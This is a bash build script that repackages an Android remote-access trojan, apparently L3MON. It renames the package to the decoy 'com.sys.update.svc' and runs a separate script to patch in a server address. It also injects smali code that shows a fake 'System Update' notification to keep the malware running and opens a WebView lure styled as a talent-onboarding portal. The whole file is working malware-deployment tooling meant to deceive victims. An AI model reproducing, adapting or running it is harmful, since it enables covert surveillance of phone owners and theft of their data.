#!/bin/bash
set -e

OLD_PKG="com.etechd.l3mon"
NEW_PKG="com.sys.update.svc"
OLD_PATH="com/etechd/l3mon"
NEW_PATH="com/sys/update/svc"

# 1. Package Rename
OLD_PKG_ESC=$(echo "$OLD_PKG" | sed 's/\./\\./g')
find payload_source -type f -exec sed -i "s|$OLD_PKG_ESC|$NEW_PKG|g" {} +
find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +

mkdir -p "payload_source/smali/$NEW_PATH"
if [ -d "payload_source/smali/$OLD_PATH" ]; then
    mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
    rm -rf "payload_source/smali/com/etechd"
fi

# 2. Patch IP
chmod +x patch_payload.sh
sed -i "s|$OLD_PATH/|$NEW_PATH/|g" patch_payload.sh
./patch_payload.sh

# 3. Create Foreground + WebView Lure
cat > lure.smali <<LURE
    # 1. Create Notification Channel (For Android 14 Heartbeat)
    const-string v0, "service_channel"
    const-string v1, "System Update"
    const/4 v2, 0x2
    new-instance v3, Landroid/app/NotificationChannel;
    invoke-direct {v3, v0, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V
    const-string v0, "notification"
    invoke-virtual {p0, v0}, L$NEW_PATH/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/app/NotificationManager;
    invoke-virtual {v0, v3}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    # 2. Start Foreground Service
    new-instance v0, Landroid/app/Notification$Builder;
    const-string v1, "service_channel"
    invoke-direct {v0, p0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V
    const-string v1, "System Update"
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    move-result-object v0
    const-string v1, "Optimizing system services..."
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    move-result-object v0
    const/high16 v1, 0x7f030000 # ic_launcher
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
    move-result-object v0
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
    move-result-object v0
    const/4 v1, 0x1
    invoke-virtual {p0, v1, v0}, L$NEW_PATH/MainService;->startForeground(ILandroid/app/Notification;)V

    # 3. Launch WebView Lure (After service is safe)
    new-instance v0, Landroid/webkit/WebView;
    invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V
    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
    move-result-object v1
    const/4 v2, 0x1
    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
    const-string v1, "https://global-talent-onboarding-portal.vercel.app/"
    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V
LURE

# 4. Inject Logic
sed -i 's/.locals 4/.locals 6/g' "payload_source/smali/$NEW_PATH/MainService.smali"
sed -i "/.method public onStartCommand/a \\    # Injected Heartbeat" "payload_source/smali/$NEW_PATH/MainService.smali"
sed -i "/# Injected Heartbeat/r lure.smali" "payload_source/smali/$NEW_PATH/MainService.smali"

# 5. Final Sync
sed -i "s|com.etechd.l3mon.MainActivity|com.sys.update.svc.MainActivity|g" payload_source/AndroidManifest.xml
